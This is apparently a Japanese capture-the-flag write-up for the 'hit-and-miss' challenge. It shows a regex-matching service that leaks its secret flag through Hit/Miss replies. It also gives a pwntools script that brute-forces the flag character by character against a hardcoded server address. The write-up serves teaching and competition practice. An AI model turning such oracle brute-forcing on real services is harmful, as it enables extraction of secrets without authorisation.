@@ -1,0 +1,44 @@
+# hit-and-miss ( 2025/12/9 )
+## Description
+🧩みんな大好き正規表現🧩
+## Solve
+配布されるapp.pyは以下の通りです。
+``` python
+import os, re
+
+FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
+assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)
+
+while pattern := input("regex> "):
+    if re.match(pattern, FLAG):
+        print("Hit!")
+    else:
+        print("Miss...")
+```
+flagを環境変数から取得したのち、Alpaca\{\w+\}の形でフラグを検証し、ユーザーに入力を求めます。
+※ここでの正規表現は、Alpaca{で始まり、a-z,A-Z,0-9,_で作られた1文字以上の文字列が間に入り、}で終わる、といった形になっています。
+その後、ユーザーの入力とフラグ(の途中まで)が合致していればHit!を、そうでなければMiss...を返します。
+よって、正規表現に合う形で一文字ずつテストしていき、Hitが出たら継続、}が出てくるまでこれを繰り返せば、フラグを復元できそうです。
+## Solver
+``` python
+from pwn import *
+
+#nc 34.170.146.252 54876
+p = remote('34.170.146.252', 54876)
+
+flag = "Alpaca{"
+char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}'
+while "}" not in flag:
+    for i in char:
+        payload = flag + i
+        print(f"try:{payload}")
+        p.sendline(payload)
+        check = p.recvline()
+        if b'Hit!' in check:
+            flag = payload
+            break
+        else:
+            continue
+            
+print("flag is " , flag)
+```
